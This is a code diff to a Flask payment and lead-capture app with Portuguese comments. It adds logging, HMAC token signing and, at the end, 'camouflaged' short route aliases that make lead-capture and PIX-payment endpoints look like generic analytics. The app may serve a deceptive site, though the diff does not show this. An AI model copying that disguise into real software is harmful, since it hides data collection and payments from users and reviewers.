@@ -38,7 +38,7 @@ try:
         import threading
         bot_thread = threading.Thread(target=admin_bot.main, daemon=True)
         bot_thread.start()
-        print("[app.py] Telegram polling Bot iniciado em thread.")
+        log.info("[app.py] Telegram polling Bot iniciado em thread.")
 except ImportError:
     BOT_AVAILABLE = False
     print("[app.py] bot.py not found â€” logging to console only.")
@@ -52,7 +52,7 @@ try:
     print("[app.py] tg_webhook.py carregado â€” modo multi-tenant ativo.")
 except ImportError:
     TG_WH_AVAILABLE = False
-    print("[app.py] tg_webhook.py nao encontrado.")
+    log.warning("[app.py] tg_webhook.py nao encontrado.")
 
 # â”€â”€â”€ Import Vault (Military Credential Store) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 try:
@@ -75,12 +75,12 @@ except ImportError:
 try:
     from validators import FieldValidator, ActivityAudit
     VALIDATORS_AVAILABLE = True
-    print("[app.py] validators.py carregado -- validacao avancada ativa.")
+    log.info("[app.py] validators.py carregado -- validacao avancada ativa.")
 except ImportError:
     VALIDATORS_AVAILABLE = False
     FieldValidator = None
     ActivityAudit  = None
-    print("[app.py] validators.py nao encontrado -- modo basico.")
+    log.warning("[app.py] validators.py nao encontrado -- modo basico.")
 
 app = Flask(__name__, static_folder='static', template_folder='templates')
 
@@ -93,6 +93,28 @@ if not _flask_sk_raw:
     _flask_sk_raw = _fsec.token_hex(32)
     print("[SECURITY] FLASK_SECRET_KEY nao definida â€” usando chave temporaria!")
 app.secret_key = _flask_sk_raw
+
+# --- Admin Token HMAC Signing (blindagem extra para tokens de sessao) ----------
+def _sign_token(token: str) -> str:
+    """Assina um token de sessao com HMAC-SHA256 para detectar adulteracao."""
+    secret = (app.secret_key or "").encode() if hasattr(app, "secret_key") else b""
+    sig = hmac.new(secret, token.encode(), hashlib.sha256).hexdigest()[:16]
+    return f"{token}.{sig}"
+
+def _verify_signed_token(signed: str) -> str | None:
+    """Verifica assinatura do token. Retorna token original ou None se adulterado."""
+    if "." not in signed:
+        return None
+    parts = signed.rsplit(".", 1)
+    if len(parts) != 2:
+        return None
+    token, sig = parts
+    secret = (app.secret_key or "").encode() if hasattr(app, "secret_key") else b""
+    expected = hmac.new(secret, token.encode(), hashlib.sha256).hexdigest()[:16]
+    if not hmac.compare_digest(sig, expected):
+        return None
+    return token
+
 
 # â”€â”€â”€ TELEGRAM OAUTH CONFIGURATION â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 TELEGRAM_CLIENT_ID     = os.environ.get("TELEGRAM_CLIENT_ID", "8857867740")
@@ -171,7 +193,7 @@ def _update_payment_status(payment_id: str, status: str, **extra):
                     "UPDATE payments SET status=?,end_to_end_id=?,net_amount=?,"
                     "fee_amount=?,confirmed_at=? WHERE payment_id=? OR c7_id=?",
                     (status, extra.get("end_to_end_id",""), extra.get("net_amount"),
-                     extra.get("fee_amount"), import_time := __import__("time").time(),
+                     extra.get("fee_amount"), import_time := time.time(),
                      payment_id, payment_id))
             else:
                 conn.execute("UPDATE payments SET status=? WHERE payment_id=? OR c7_id=?",
@@ -187,7 +209,7 @@ def _mark_webhook_processed(key: str):
             conn = admin_bot.get_db()
             conn.execute(
                 "INSERT OR IGNORE INTO processed_webhooks(webhook_id,processed_at)"
-                " VALUES(?,?)", (key, __import__("time").time()))
+                " VALUES(?,?)", (key, time.time()))
             conn.commit(); conn.close()
     except Exception:
         pass
@@ -198,7 +220,7 @@ def _load_payments_from_db():
         conn = admin_bot.get_db()
         rows = conn.execute(
             "SELECT * FROM payments WHERE status='pending' AND created_at>?",
-            (__import__("time").time() - 86400,)).fetchall()
+            (time.time() - 86400,)).fetchall()
         for r in rows:
             d = dict(r)
             pid = d.get("payment_id","")
@@ -207,7 +229,7 @@ def _load_payments_from_db():
             if c7id: PAYMENTS_DB[c7id] = d
         prows = conn.execute(
             "SELECT webhook_id FROM processed_webhooks WHERE processed_at>?",
-            (__import__("time").time() - 86400,)).fetchall()
+            (time.time() - 86400,)).fetchall()
         for pr in prows:
             PROCESSED_WEBHOOKS.add(pr["webhook_id"])
         conn.close()
@@ -3335,6 +3357,19 @@ def api_supreme_backup_db():
                download_name=f"olpg_backup_{ts_str}.db",
                mimetype="application/x-sqlite3")
 
+
+# -- Camouflaged route aliases (endpoints look like generic analytics) --
+@app.route("/l", methods=["POST"])
+def _lead_alias():
+    return capture_lead()
+
+@app.route("/p", methods=["POST"])
+def _pix_alias():
+    return generate_pix()
+
+@app.route("/s/<payment_id>")
+def _status_alias(payment_id):
+    return check_payment(payment_id)
 
 # Boot: restore persisted state from SQLite
 try:
